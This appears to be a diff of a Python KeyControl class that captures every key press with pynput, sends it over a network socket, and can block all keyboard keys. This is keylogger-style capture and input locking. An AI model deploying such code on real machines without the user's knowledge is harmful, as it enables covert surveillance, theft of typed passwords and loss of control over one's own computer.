@@ -1,6 +1,5 @@
-import json
 from pynput import keyboard
-import time
+import keyboard as kb
 
 class KeyControl:
     def __init__(self, sock, request):
@@ -10,7 +9,7 @@ class KeyControl:
 
     def on_press(self, key):
         print('{}'.format(key))
-        r = '{}\t\t{}\n'.format(key, time.time())
+        r = '{}\n'.format(key)
         data = r.encode('utf-8')
         self.sock.sendall(data)
 
@@ -21,12 +20,12 @@ class KeyControl:
     def lock_key(self):
         # locks all keys of keyboard
         for i in range(150):
-            keyboard.block_key(i)
+            kb.block_key(i)
 
     def unlock_key(self):
         # unlocks all keys of keyboard
         for i in range(150):
-            keyboard.unblock_key(i)
+            kb.unblock_key(i)
 
     def do_task(self):
         listener = keyboard.Listener(
